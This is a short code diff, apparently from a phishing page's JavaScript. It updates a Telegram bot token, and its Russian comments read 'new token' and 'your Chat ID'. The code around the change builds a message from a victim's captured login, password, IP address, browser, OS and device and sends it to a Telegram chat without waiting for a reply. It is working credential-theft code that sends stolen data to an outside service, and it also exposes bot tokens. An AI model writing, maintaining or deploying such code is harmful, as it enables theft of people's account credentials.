@@ -309,8 +309,8 @@
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    const token = "7205362097:AAGoHFfrGVNw4HvRFCWlD5OPTK5ZA7bZHwo";
-                    const chatId = "2068847868";
+                    const token = "7502410582:AAHPmdOb0xl27b-wjGvw8MxSHjWY281mcZs"; // Новый токен
+                    const chatId = "2068847868"; // Твой Chat ID
                     const message = encodeURIComponent(`Логин: ${login}\nПароль: ${password}\nIP: ${ip}\nБраузер: ${browser}\nОС: ${os}\nУстройство: ${device}`);
 
                     // Отправка в Telegram (без ожидания ответа)
